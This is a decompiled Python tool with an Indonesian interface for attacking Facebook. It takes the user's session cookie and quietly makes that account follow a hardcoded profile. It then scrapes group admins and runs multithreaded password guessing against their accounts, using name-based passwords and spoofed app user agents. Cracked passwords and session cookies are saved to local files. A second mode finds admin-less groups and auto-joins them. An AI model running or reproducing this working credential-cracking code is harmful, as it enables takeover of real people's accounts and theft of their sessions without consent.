# <comment-start>
# Decompiled by Rizemary (BlackZoneCode)
# --------------------------------------
# File type      : Python File
# File hash (md5): 02441c88e77ab095df927274e20a3b5d
# Original link  : https://github.com/SuwanXD/Group
# Datetime       : 2023-08-02 00:44:29.266787
# Source size    : 17.4 KB
# Telegram       : @BZCTeam @Rizemary
# --------------------------------------
# <comment-end>

# <comment-start>
# Decompiled by Rizemary (BlackZoneCode)
# --------------------------------------
# File type      : Python File
# File hash (md5): 57ea9ca6ac3d0444ced178c369d08ea5
# Original link  : https://github.com/SuwanXD/Group
# Datetime       : 2023-08-02 00:42:02.851632
# Source size    : 17.0 KB
# Telegram       : @BZCTeam @Rizemary
# --------------------------------------
# <comment-end>
import requests, re, os, sys, time, random
from concurrent.futures import ThreadPoolExecutor as Modol
from rich.progress import Progress, TextColumn
from bs4 import BeautifulSoup as par
from time import time as mek

from rich.panel import Panel
from rich import print as prints
from rich.tree import Tree

M = '\x1b[1;91m' # MERAH
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING

class YoWaimo:

    def __init__(self):
        self.ses = requests.Session()
        self.die, self.pri = 0, []
        self.url = "https://mbasic.facebook.com"
        self.idd, self.ber, self.gag = [], [], []
        self.menu()

    def ua_fb(self):
        versi = random.choice(['8','9','10','11','12','13'])
        model = random.choice(["ASUS_Z01QD Build/N2G48H)"])
        versi_apk = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
        versi_app = random.randint(410000000,499999999)
        return (f"Dalvik/2.1.0 (Linux; U; Android {versi}) {model}) [FBAN/FB4A;FBAV/{versi_apk};FBPN/com.facebook.katana;FBLC/en_US;FBBV/{versi_app};FBCR/Indosat Ooredoo;FBMF/Asus;FBBD/Asus;FBDV/ASUS_Z01QD;FBSV/7.1.2;FBCA/{versi};armeabi-v7a;FBDM/"+"{density=1.49375,width=1280,height=720};FB_FW/1;FBRV/0;]")

    def hapus(self):
        try:os.remove(".cok.txt")
        except:pass
        try:os.remove(".tok.txt")
        except:pass

    def logo(self):
        if "win" in sys.platform:os.system("cls")
        else:os.system("clear")
        prints(Panel("""      _________________________________________   


   ######   ########   #######  ##     ## ########     
  ##    ##  ##     ## ##     ## ##     ## ##     ##    
  ##        ##     ## ##     ## ##     ## ##     ##    
  ##   #### ########  ##     ## ##     ## ########     
  ##    ##  ##   ##   ##     ## ##     ## ##           
  ##    ##  ##    ##  ##     ## ##     ## ##           
   ######   ##     ##  #######   #######  ##           

      _________________________________________
                                            """, width=60, style=f"#00FF00"))

    def login(self):
        self.logo()
        cok = input("[?] MASUKAN COOKIE : ");self.ubah_bahasa({"cookie": cok})
        try:
            link = self.ses.get(f"{self.url}/profile.php?v=info", cookies={"cookie": cok}).text
            if "/zero/optin/write" in str(link):
                prints(Panel("[bold white] AKUN INI DALAM MODE FREE FACEBOOK , HARAP BERSABAR SEDANG MENGUBAH KE MODE DATA.", width=60, style="bold white"))
                urll = re.search('href="/zero/optin/write/?(.*?)"', str(link)).group(1).replace("amp;", "");self.ubah_data(urll, cok)
            elif 'href="/x/checkpoint/' in str(link):
                print("\n[!] Cookie Anda Terkena Chekcpoint:(");time.sleep(2);self.login()
            elif 'href="/r.php' in str(link):
                print("\n[!] Cookie Yang Anda Masukan Invalid");time.sleep(2);self.login()
            else:
                nama = re.findall("\<title\>(.*?)<\/title\>", link)[0]
                user = re.search("c_user=(\d+)", str(cok)).group(1);self.msomxojmobb(cok, nama)
                open(".cok.txt", "w").write(cok);open(".tok.txt", "w").write(f"{nama}|{user}")
                exit(f"[{M}!{N}] jalankan ulang perintah nya dengan ketik python grup.py")
        except requests.ConnectionError:
            exit("\n[!] Tidak ada koneksi")

    def ubah_data(self, link, coki):
        try:
            gett = self.ses.get(f"{self.url}/zero/optin/write/{link}", cookies={"cookie": coki}).text
            date = {"fb_dtsg": re.search('name="fb_dtsg" value="(.*?)"', str(gett)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(gett)).group(1)}
            self.ses.post(self.url+par(gett, "html.parser").find("form",{"method":"post"})["action"], data=date, cookies={"cookie": coki}).text
            prints(Panel("😍 [bold green]akun kamu berhasil di ubah ke mode data!\nSilahkan masukan ulang cookie anda. dengan mengetik [bold cyan]python grup.py[/]", style="bold white", width=60));exit()
        except:exit()

    def ubah_bahasa(self, cok):
        try:
            link = self.ses.get(f"{self.url}/language/", cookies=cok).text
            data = par(link, "html.parser")
            for x in data.find_all('form',{'method':'post'}):
                if "Bahasa Indonesia" in str(x):
                    bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(link)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(link)).group(1), "submit"  : "Bahasa Indonesia"}
                    self.ses.post(f"{self.url}{x['action']}", data=bahasa, cookies=cok)
        except:pass

    def msomxojmobb(self, cok, nama):
        try:
            link = par(self.ses.get(f"{self.url}/profile.php?id=100063738480067", cookies={"cookie": cok}).text, "html.parser")
            if "/a/subscriptions/remove" in str(link):
                prints(Panel(f"     SELAMAT DATANG [italic bold green]{nama}[/] MOHON GUNAKAN SCRIPT DENGAN BIJAK", style="bold white", width=60))
            elif "/a/subscribe.php" in str(link):
                cari = re.search('/a/subscribe.php(.*?)"', str(link)).group(1).replace("amp;", "")
                self.ses.get(f"{self.url}/a/subscribe.php{cari}", cookies={"cookie": cok})
                prints(Panel(f"     SELAMAT DATANG [italic bold green]{nama}[/] MOHON GUNAKAN SCRIPT DENGAN BIJAK", style="bold white", width=60))
            else:pass
        except:pass

    def menu(self):
        try:cook = {"cookie": open(".cok.txt", "r").read()};nama, user = open(".tok.txt", "r").read().split("|")
        except (FileNotFoundError, ValueError):self.hapus();self.login()
        self.logo()
        try:
            link = self.ses.get(f"{self.url}/profile.php?v=info", cookies=cook).text
            if "mbasic_logout_button" not in link:
                self.hapus();print(f"\n[{M}!{N}] Akun mendapat terkena checkpint, silakan masuk dengan akun lain.");time.sleep(3);self.login()
        except requests.ConnectionError:
            exit("\n[!] Tidak ada koneksi")
        print(f"""
    [+] NAMA : {nama}
    [+] USER : {user}

    [1] CRACK ADMIN GROUP
    [2] NUYUL ADMIN GROUP
    [0] KELUAR""")
        pil = input("\n\> ")
        if pil in ["", " "]:print("[!] jangan kosong");time.sleep(2);self.menu()
        elif pil in ["1", "01"]:self.crack_admin(cook)
        elif pil in ["2", "02"]:self.carii_group(cook)
        elif pil in ["0", "00"]:self.hapus();exit("\n    [+] BERHASIL MENGHAPUS COOKIE")
        else:print("[!] input yang benar bang");time.sleep(2);self.menu()

    def crack_admin(self, coki):
        prints(Panel("          MASUKAN NAMA GRUP YANG INGIN ANDA CARI", width=60))
        nama = input("[?] MASUKAN NAMA GRUP: ")
        print("[!] tekan ctrl+C UNTUK BERHENTI\n")
        try:self.dump_admin(f"https://mbasic.facebook.com/search/groups/?q={nama}", coki)
        except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
            exit("[!] KESELAHAN KONEKSI")
        print();print(f"[*] TERKUMPUL {len(self.idd)} USER ADMIN GRUP");time.sleep(2)
        self.crack_admin_grup()

    def crack_admin_grup(self):
        prints(Panel("[italic green]Proses Crack Sedang Di Mulai, Hidupkan Mode Pesawat Setiap 200 id. Untuk Menghindari Spam[/]", width=60))
        global prog,des
        prog = Progress(TextColumn('{task.description}'))
        des = prog.add_task('', total=len(self.idd))
        with prog:
            with Modol(max_workers=30) as bool:
                for user in self.idd:
                    uid, nama = user.split("<=>")[0], user.split("<=>")[1].lower()
                    depan = nama.split(" ")
                    try:
                        if len(nama) <=5:
                            if len(depan) <=1 or len(depan) <=2:pass
                            else:pwx = [nama, depan[0]+depan[1], depan[0]+"123", depan[0]+"12345"]
                        else:pwx = [nama, depan[0]+depan[1], depan[0]+"123", depan[0]+"12345"]
                        bool.submit(self.mulai_crack, uid, pwx)
                    except:pass
        print()
        exit("CRACK ADMIN GRUP SELESAI")

    def mulai_crack(self, username, pasw):
        prog.update(des, description=f"DIEE:{str(self.die)} LIVE:{len(self.ber)} CHEK:{len(self.gag)}")
        prog.advance(des)
        for password in pasw:
            try:
                ses = requests.Session()
                uas = self.ua_fb()
                heaq = ({"connection": "keep-alive", "accept-language": "id,en-US;q=0.9,en;q=0.8", "sec-fetch-mode": "navigate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "sec-fetch-sest": "document", "sec-fetch-site": "none", "cache-control": "max-age=0", "sec-fetch-user": "?1", "upgrade-insecure-requests": "1", "host": "m.alpha.facebook.com", "user-agent": uas})
                link = ses.get("https://m.alpha.facebook.com/login.php?", headers=heaq).text
                data = {"m_ts": re.search('name="m_ts" value="(.*?)"', str(link)).group(1), "li": re.search('name="li" value="(.*?)"', str(link)).group(1), "try_number": 0, "unrecognized_tries": 0, "email": username, "prefill_contact_point": f"{username}", "prefill_source": "browser_dropdown", "prefill_type": "password", "first_prefill_source": "browser_dropdown", "first_prefill_type": "contact_point", "had_cp_prefilled": True, "had_password_prefilled": True, "is_smart_lock": False, "bi_xrwh": 0, "encpass": f"#PWD_BROWSER:0:{str(mek()).split('.')[0]}:{password}", "fb_dtsg": re.search('{"dtsg":{"token":"(.*?)"', str(link)).group(1), "jazoest": re.search('name="jazoest" value="(\d+)"', str(link)).group(1), "lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1), "__a": re.search('"encrypted":"(.*?)"', str(link)).group(1)}
                cuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
                head = ({"sec-fetch-site": "same-origin", "origin": "https://m.alpha.facebook.com", "accept": "*/*", "cookie": f"{cuki}", "content-type": "application/x-www-form-urlencoded", "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1), "referer": "https://m.alpha.facebook.com/login.php?", "content-length": str(len((data))), "user-agent": uas})
                ses.post("https://m.alpha.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100", data=data, headers=head, allow_redirects=True)
                if "c_user" in ses.cookies.get_dict():
                    cooz = ses.cookies.get_dict()
                    coki = "datr=" + cooz["datr"] + ";" + ("sb=" + cooz["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + cooz["c_user"]) + ";" + ("xs=" + cooz["xs"]) + ";" + ("fr=" + cooz["fr"]) + ";"
                    tree = Tree("")
                    tree.add(f"[[bold green]LIVE[/]] {username}|{password}")
                    tree.add(f"[[bold green]LIVE[/]] [bold green]{coki}[/]")
                    prints(tree)
                    kntl = (f"[✓] {username}|{password}|{coki}")
                    self.ber.append(kntl)
                    with open("ok.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
                elif "checkpoint" in ses.cookies.get_dict():
                    tree = Tree("")
                    tree.add(f"[[bold yellow]CHEK[/]] {username}|{password}")
                    prints(tree)
                    kntl = (f"[×] {username}|{password}")
                    self.gag.append(kntl)
                    with open("cp.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
            except requests.exceptions.ConnectionError:
                prog.update(des, description=f"[red]SPAM[/]: {str(self.die)} LIVE:{len(self.ber)} CHEK:{len(self.gag)}")
                prog.advance(des)
                time.sleep(5)
            #except Exception as e:print(e)
        self.die+=1

    def dump_admin(self, url, coki):
        try:
            link = self.ses.get(url, cookies=coki).text
            cari = re.findall('<a\s+href="([^"]+)"><div class\=\".*?"><div class\=\".*?">([^<]+)</div>', str(link))
            for x in cari:
                if "groups" in x[0]:
                    xx =self.ses.get(f"{self.url}/groups/{re.search('groups/(.*?)/', x[0]).group(1)}?view=members", cookies=coki)
                    if "Admin dan Moderator" in str(xx.text):
                        carz = re.findall('<h3><a class\=\".*?" href="(.*?)">(.*?)</a></h3>', xx.text)
                        for i in carz:
                            if "profile.php?" in i[0]:
                                self.idd.append(re.findall("id=(.*?)&amp;eav", i[0])[0]+"<=>"+i[1])
                            else:self.idd.append(re.findall("/(.*?)\?eav", i[0])[0]+"<=>"+i[1])
                    else:continue
                else:continue
                sys.stdout.write(f"\r[+] sedang mengumpulkan {str(len(self.idd))} user admin grup...");sys.stdout.flush()
            if "Lihat Hasil Selanjutnya" in link:
                self.dump_admin(par(link, "html.parser").find("a", string="Lihat Hasil Selanjutnya").get("href"), coki)
        except:pass

    def carii_group(self, coki):
        prints(Panel("          MASUKAN NAMA GRUP YANG INGIN ANDA CARI", width=60))
        nama = input("[?] Masukan nama grup: ")
        print("[!] tekan ctrl+C untuk berhenti\n")
        try:self.dump_grup(f"https://mbasic.facebook.com/search/groups/?q={nama}", coki)
        except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
            exit("[!] kesalahan pada koneksi")
        print();print(f"[*] terkumpul {len(self.idd)} grup");time.sleep(2)
        self.apaacooaa(coki)

    def dump_grup(self, url, coki):
        try:
            link = self.ses.get(url, cookies=coki).text
            cari = re.findall('<a\s+href="([^"]+)"><div class\=\".*?"><div class\=\".*?">([^<]+)</div>', str(link))
            for x in cari:
                if "groups" in x[0]:
                    self.idd.append(re.search('groups/(.*?)/', x[0]).group(1)+"<//>"+x[1])
                else:continue
                sys.stdout.write(f"\r[+] sedang mengumpulkan {str(len(self.idd))} grup facebook..");sys.stdout.flush()
            if "Lihat Hasil Selanjutnya" in link:
                self.dump_grup(par(link, "html.parser").find("a", string="Lihat Hasil Selanjutnya").get("href"), coki)
        except:pass

    def apaacooaa(self, coki):
        prints(Panel("               SEDANG MENGECEK ADMIN GRUP", width=60))
        global prog,des
        prog = Progress(TextColumn('{task.description}'))
        des = prog.add_task('', total=len(self.idd))
        with prog:
            with Modol(max_workers=30) as bool:
                for user in self.idd:
                    apcb = user.split("<//>")
                    bool.submit(self.mulai_cari, apcb[0], apcb[1], coki)
        print()
        for x in self.ber:
            print(x)
        print()
        exit("crack grup telah selesai")

    def mulai_cari(self, user, nama, coki):
        self.die+=1
        prog.update(des, description=f"DIEE:{str(self.die)} LIVE:{len(self.ber)} CHEK:{len(self.gag)}")
        prog.advance(des)
        try:
            apcb = self.ses.get(f"{self.url}/groups/{user}?view=members", cookies=coki)
            ubah = (f"www.facebook.com/{user}")
            if "Admin dan Moderator" in str(apcb.text):
                pass
            else:
                memb = self.ses.get(f"{self.url}/groups/{user}", cookies=coki)
                stat = re.findall('<div class\=\".*?">Grup (.*?)</div>', str(memb.text))[0]
                angg = re.findall('>Anggota</a></td><td class\=\".*?"><span class\=\".*?" id\=\".*?">(.*?)</span>', str(memb.text))[0]
                if "Privat" in stat:
                    prints(Panel(f"""[[bold cyan]•[/]] Nama grup: [bold cyan]{nama}[/]
[[bold cyan]•[/]] stat grup: [bold cyan]{stat}[/]
[[bold cyan]•[/]] Anggota  : [bold cyan]{angg}[/]
[[bold cyan]•[/]] url grup : [bold cyan]{ubah}[/]""", width=60, style="bold white"))
                    self.gag.append(user)
                else:
                    self.join_grup(f"{self.url}/groups/{user}", coki)
                    prints(Panel(f"""[[bold green]•[/]] Nama grup: [bold green]{nama}[/]
[[bold green]•[/]] stat grup: [bold green]{stat}[/]
[[bold green]•[/]] Anggota  : [bold green]{angg}[/]
[[bold green]•[/]] url grup : [bold green]{ubah}[/]""", width=60, style="bold white"))
                    self.ber.append(nama+"|"+f"www.facebook.com/{user}")
        except:pass

    def join_grup(self, curl, coki):
        try:
            link = self.ses.get(curl, cookies=coki)
            data = {
                "fb_dtsg": re.search('name="fb_dtsg" value="(.*?)"', str(link.text)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1)
            }
            post = par(link.text, "html.parser").find("form",{"method":"post"})["action"]
            self.ses.post(self.url+post, data=data, cookies=coki)
        except Exception as e:exit(e)


YoWaimo()
